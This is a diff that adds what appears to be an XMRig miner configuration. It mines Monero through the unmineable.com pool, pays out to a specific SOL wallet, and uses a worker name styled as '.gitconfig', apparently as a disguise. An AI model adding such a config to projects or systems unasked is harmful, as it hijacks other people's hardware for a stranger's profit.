@@ -1,0 +1,38 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "astrobwt-max-size": 550,
+        "astrobwt-avx2": false,
+        "*": {
+            "intensity": 1,
+            "threads": 4,
+            "affinity": -1
+        },
+        "kawpow": false
+    },
+    "opencl": false,
+    "cuda": false,
+    "donate-level": 0,
+    "donate-over-proxy": 1,
+    "pools": [
+        {
+            "coin": "monero",
+            "algo": "rx/0",
+            "url": "stratum+ssl://rx-eu.unmineable.com:443",
+            "user": "SOL:EAkFko182Ud2HQBFffjQxBZhcDedjCNxDNWAcZsdhvPG.gitconfig#jjna-07q1",
+            "pass": "x",
+            "tls": false,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ]
+}
